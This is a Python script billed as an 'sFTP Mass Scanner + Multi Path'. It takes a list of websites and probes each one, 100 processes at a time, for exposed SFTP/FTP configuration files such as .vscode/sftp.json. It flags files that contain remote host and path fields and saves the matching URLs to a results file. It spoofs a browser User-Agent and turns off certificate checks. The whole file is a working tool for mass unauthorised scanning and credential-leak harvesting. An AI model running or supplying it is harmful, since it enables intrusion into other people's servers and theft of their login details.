import requests, os, platform
from platform import system
from multiprocessing import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
pathsftp = ["application/.vscode/sftp.json", "application/.vscode/.ftpconfig", "application/.vscode/sftp-config.json", "/.ftpconfig", "/ftp.json", "/sftp.json", "/sftp-config.json", "/ftp-config.json", "/.vscode/ftp.json", "/.vscode/sftp.json", "/.vscode/sftp.json.save", "/.vscode/sftp.json~", "/.vscode/sftp-config.json", "/.vscode/sftp-config.save", "/.vscode/sftp-config~"]
def clear():
    if system() == "Linux":
        os.system("clear")
    else:
        os.system("cls")
def banner():
    print(f"""
 __    ___  _____  ___ _    {Fore.YELLOW}@wongalus7{Fore.RESET}   __    
/ _\  / __\/__   \/ _ \ |__   ___  _   _/ _\   
\ \  / _\    / /\/ /_)/ '_ \ / _ \| | | \ \    
_\ \/ /     / / / ___/| |_) | (_) | |_| |\ \   
\__/\/      \/  \/    |_.__/ \___/ \__, \__/   
{Fore.YELLOW}sFTP Mass Scanner + Multi Path{Fore.RESET}     |___/       
""")
def main(url):
    s = requests.Session()
    headerx = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'}
    for i in pathsftp:
        try:
            r = s.get(f'http://{url}/{i}', timeout=7, verify=False)
            if '"remote_path"' in r.text or '"host": "' in r.text and r.status_code != 404:
                print(f'{Fore.GREEN}{url}/{i}{Fore.WHITE}')
                with open('result/sftp.txt', 'a+') as f:
                    f.write(f'{url}/{i}\n')
                return True
            else:
                print(f'{Fore.RED}{url}/{i}')
        except:
            pass
clear()
banner()
pathsftpjembut = input("Website list (Without http/s): ")
asu = open(pathsftpjembut).read().splitlines()
p = Pool(100)
p.map(main, asu)
